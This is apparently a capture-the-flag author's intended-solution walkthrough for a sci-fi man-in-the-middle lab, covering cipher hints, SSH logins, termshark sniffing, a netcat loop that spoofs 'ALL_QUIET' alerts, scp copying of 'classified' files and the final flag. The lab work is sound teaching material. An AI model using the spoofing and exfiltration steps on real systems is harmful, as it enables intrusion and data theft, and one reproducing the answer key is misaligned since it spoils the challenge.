My challenge tackles the concept of a man in the middle attack, through a sci-fi arg lens, where the user must navigate and manipulate networking concepts like ssh, dockerfiles, package sniffing and netcat. 

Solution:
1) Find the outpost-04 user
translate morse code from the hint document

2) ssh onto outpost-04
```bash
ssh -p 2222 outpost-04@localhost
```
3) unencrypt the caeser cipher
located in the rebel journal

4) attempt ssh into 4rch1v3 user
```bash
ssh -p 2222 4rch1v3@localhost
```
5) use termshark to sniff packages 
```bash
ip link show type bridge
sudo termshark -i br-xxxxxxxxxx -f "port 9000"
```
6) observe all quiet and alert messages and attempt a spoof
one possible solution is
```bash
while true; do echo "ALL_QUIET" | nc localhost 9000; sleep 0.2; done
```
7) ssh in again
```bash
ssh -p 2222 4rch1v3@localhost
```
8) scp the classified files onto home directory
```bash
scp -r ./classified user@ip:/home/user/path
```
9) scp transmit.py & __pycache__ onto home directory
```bash
ssh -p 2222 outpost-04@localhost
scp -r ./transmit.py user@ip:/home/user/path
scp -r ./__pycache__ user@ip:/home/user/path
```
10) decide what file to transmit and transmit it
```bash
python transmit.py file --port /dev/tty/ACM0
```
11) get flag from final messsage + name of file
```bash
ctf{fortherebellionstarfire}
```
This is the intended solution, other solutions and exploits may be possible, this solution covers many networking skills like permissions, script running, scp, ssh, termshark & while loops and a little bit of python. It is designed primarily to be a fun user experience

